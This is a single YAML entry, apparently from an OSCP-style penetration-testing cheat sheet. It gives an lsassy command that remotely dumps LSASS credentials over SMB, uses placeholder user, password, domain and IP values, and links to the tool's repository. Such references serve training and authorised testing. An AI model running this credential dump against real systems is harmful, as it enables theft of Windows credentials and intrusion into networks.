---
command: |
  lsassy -u $USER -p $PASSWORD -d $DOMAIN $IP
description: Dump LSASS credentials remotely without touching disk.
os: [Linux]
category: [oscp, cli]
service: [SMB]
phase: [PrivEsc]
references:
  - https://github.com/Hackndo/lsassy
---
